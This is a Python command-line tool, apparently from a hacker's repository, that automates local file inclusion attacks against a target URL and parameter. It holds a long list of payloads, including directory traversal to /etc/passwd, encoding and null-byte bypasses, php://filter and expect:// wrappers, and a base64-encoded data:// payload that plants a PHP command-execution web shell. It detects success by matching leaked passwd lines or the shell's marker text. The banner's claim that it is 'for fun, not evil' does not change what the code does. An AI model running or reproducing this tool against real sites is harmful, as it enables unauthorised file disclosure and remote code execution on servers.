from threading import Thread, Event
from argparse import ArgumentParser
from urllib3 import disable_warnings, exceptions
from requests import get
from sys import stdout
from time import sleep

disable_warnings(exceptions.InsecureRequestWarning)
spinner_event = Event()


def logo():

    blue_bold = "\033[1;34m"
    reset = "\033[0m"

    banner = f"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              **************************
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 Made By: Jsmoreira02
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              **************************
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀               Hacking tool for Exploit/
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀                      Bypass LFI
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀              **************************
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀                       WARNING:
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀     < This tool is written for fun, not evil and is >
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀     < is intended to raise awareness about hacking. >
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇{blue_bold}⠐⣿⣿⣿⣿⠂{reset}⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧{blue_bold}⠈⠿⠿⠁{reset}⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀{blue_bold}⣶⣦{reset}⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{blue_bold}⠛⠛{reset}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n\n"""

    return banner


def save_ToFile(save, content):

    green = "\x1b[1;38;5;46m"
    reset = "\033[0m"
    
    if save is not None:

        try:
            with open(save, "at") as file:
                file.write(content + "\n")
            
            print(f"\n{green}[+]{reset} The results have been saved in {save}!\n")

        except Exception:
            file.close()
    else:
        pass
        

def show_output(argument, results, argument2):

    green = "\x1b[1;38;5;46m"
    reset = "\033[0m"
    
    if argument:

        sleep(2)
        print(f"\n\n{green}[+]{reset} Got results!")
        print("\n" + "---" * 15 + "HTML OUTPUT" + '---' * 15 + "\n")
        print(results)
        print("\n" + "---" * 15 + "HTML OUTPUT" + '---' * 15 + "\n\n")
    else:
        save_ToFile(argument2, results)
        pass


def Send_Requests(Attempt, url):

    Attack = get(url=url + f"?{Attempt}")
    
    if "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" in Attack.text:
        return True
    elif "jjj-qngn:k:33:33:jjj-qngn:/ine/jjj:/hfe/fova/abybtva" in Attack.text:
        return True
    elif "d3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgo=" in Attack.text:
        return True
    elif "uid=33" in Attack.text:
        return True
    elif "<?php" in Attack.text:
        return True
    elif "PD9waHAN" in Attack.text:
        return True
    elif "<?cuc" in Attack.text:
        return True
    elif "Shell done !" in Attack.text:
        return True
    else:
        return False


class Bypass_LFI:

    bypass_commands = [

        "=/etc/passwd",
        "=index.php",
        "=../../index",
        "=../index.php",
        "=../../index.php",
        "=../../../../index.php",
        "=../../../../../index.php",
        "=/etc/passwd/",
        "=/etc/passwd%00",
        "=/etc/passwd%2500",
        "=index.php%00",
        "=index.php%2500.php",
        "=/var/www/../../../etc/passwd%00",
        "=a/../../../../etc/passwd.." + ("\." * 30),
        "=a/././././." + ("/." * 20) + "/etc/passwd",
        "=/././././." + ("/." * 100) + "/etc/passwd",
        "=/../../../../etc/passwd.." + ("\." * 100),
        "=../../../etc/passwd%00",
        "=/../../../etc/passwd%00",
        "=..../..../etc/passwd",
        "=....\/....\/....\/etc\/passwd",
        "=....//....//....//....//etc/passwd",
        "=../../../etc/passwd",
        "=..\..\..\etc\passwd",
        '=\etc\passwd',
        "=/../../../etc/passwd",
        "=../../../../etc/passwd/.",
        "=../../../../../etc/passwd",
        "=../../../../../../etc/passwd",
        "=../../../etc/passwd%00",
        "=....//....//....//etc/passwd",
        "=//etc//passwd",
        "=....\/....\/....\/etc/passwd",
        "=..%252f..%252f..%252fetc%252fpasswd",
        "=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        "=%2fetc%2fpasswd",
        "=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "=%252e%252e%252fetc%252fpasswd",
        "=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc..%2Fpasswd",
        "=..%2F..%2Fetc..%2Fpasswd",
        "=%2F..%2Fetc..%2Fpasswd",
        "=/../../../../../../../../../etc/passwd....../etc/passwd....../../../../../../../../../etc/passwd",
        "=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        "=..///////..////..//////etc/passwd",
        "=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        "=../../../etc/passwd%00.png",
        "=/var/www/../../../etc/passwd%00",
        "=/var/www/../../../etc/passwd",
        "=%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "=utils/scripts/../../../../../etc/passwd",
        "=upload../../../etc/passwd",
        "=php://filter/convert.base64-encode/resource=index",
        "=php://filter/convert.base64-encode/resource=index.php",
        "=php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd",
        "=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd",
        "=php://filter/convert.base64-decode/resource=data://plain/text,L2V0Yy9wYXNzd2Q=",
        "=php://filter/convert.base64-decode/resource=data://plain/text,aW5kZXgucGhw",
        "=php://filter/convert.base64-decode/resource=data://plain/text,aW5kZXg=",
        "=data://text/plain,<?php echo base64_encode(file_get_contents('/etc/passwd')); ?>",
        "=data://text/plain,<?php echo base64_encode(file_get_contents('index')); ?>",
        "=data://text/plain,<?php echo base64_encode(file_get_contents('index.php')); ?>",
        "=data://text/plain,<?php echo base64_encode(file_get_contents('../index')); ?>",
        "=data://text/plain,<?php echo base64_encode(file_get_contents('../../index')); ?>",
        "=data://text/plain,<?php echo base64_encode(file_get_contents('../../../index')); ?>",
        "=data://text/plain,<?php echo base64_encode(file_get_contents('../index.php')); ?>",
        "=data://text/plain,<?php echo base64_encode(file_get_contents('../../index.php')); ?>",
        "=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
        "=%252e%252e%252fetc%252fpasswd%00",
        "=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "=php://filter/read=string.rot13/resource=/etc/passwd",
        "=php://filter/read=string.rot13/resource=index",
        "=php://filter/read=string.rot13/resource=index.php",
        "=php://filter/convert.base64-encode/resource=/etc/passwd",
        "=php://filter/convert.base64-encode/resource=../index.php",
        "=pHp://FilTer/convert.base64-encode/resource=/etc/passwd",
        "=pHp://FilTer/convert.base64-encode/resource=index",
        "=pHp://FilTer/convert.base64-encode/resource=index.php",
        "=PHP://filter/convert.base64-decode/resource=data://plain/text,aW5kZXg=",
        "=PHP://filter/convert.base64-decode/resource=data://plain/text,aW5kZXgucGhw",
        "=PHP://filter/convert.base64-decode/resource=data://plain/text,aW5kZXgucGhw",
        "=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
        "=php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "=php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=/etc/passwd",
        "=php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=index",
        "=php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=index.php",
        "=php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=../index.php",
        "=php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=../index",
        "=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
        "=expect://id",
        "=Li4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkZldGMuLiUyRnBhc3N3ZC4uJTJGMDAudHh0Ly8uJTAw",
        "=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc..%2Fpasswd..%2F00.txt//.%00",
        "=....//....//etc/passwd",
        "=php://filter/read=convert.base64-encode/resource=./index/../etc/passwd"
    ]

    yellow_bold = "\x1b[1;38;5;226m"
    light_blue = "\x1b[1;94m"
    dark_red = "\x1b[31;2m"
    reset = "\x1b[0m"

    def spinner(self):
    
        while not spinner_event.is_set():
            for char in "/-\|":
                stdout.write(f"\r({self.yellow_bold}{char}{self.reset}) Trying to exploit LFI...")
                stdout.flush()
                sleep(0.4)

    
    def Combinations(self, url, parameters, output, save):
        
        try:
            spinner_event.set()
            stdout.flush()
            success = 0

            sleep(3)

            for commands in self.bypass_commands:
                
                attempt = parameters + commands
                if Send_Requests(attempt, url):

                    stdout.write(f"\r{self.light_blue}| [✓]{self.reset} The target is Vulnerable!: [{attempt}]\n")
                    stdout.flush()
                    success = 1
                    response = attempt
                else:
                    continue
            
            if success == 1:
                return show_output(output, get(url=url + f"?{response}").text, save)
            
        except KeyboardInterrupt:
            return f"\n{self.dark_red}[X]{self.reset} Cancelled\n"


def main():

    dark_red = "\x1b[31;2m"
    cyan = "\x1b[1;36m"
    reset = "\x1b[0m"

    parser = ArgumentParser(
        description='Automated search for "Local File Inclusion" vulnerabilities so you can relax',
        epilog="./app.py http://127.0.0.1/ page" 
    )
    parser.add_argument("url", metavar="<Target URL>", type=str, help="URL path of page containing potential LFI vulnerability")
    parser.add_argument("parameter", metavar="<URL Parameters>", type=str, help="Vulnerable Parameter To exploit LFI")
    parser.add_argument("-o", "--output", action='store_true', help="Show Results")
    parser.add_argument("-s", "--saveToFile", type=str, metavar="", help="Save your results to a file")

    args = parser.parse_args()
    url, parameter, output, save = args.url, args.parameter, args.output, args.saveToFile

    if "/" != url[-1]:
        url + "/"
    else:
        pass

    Run = Bypass_LFI()

    print(logo())
    spinner_thread = Thread(target=Run.spinner)
    spinner_thread.daemon = True
    spinner_thread.start()
    
    Run.Combinations(url, parameter, output, save)

    try:
        spinner_thread.join()

    except KeyboardInterrupt:
        return f"\n{dark_red}[X]{reset} Cancelled\n"
    
    return f"\n{cyan}[!]{reset} Finished!\n"


if __name__ == '__main__':
    
    print(main())
            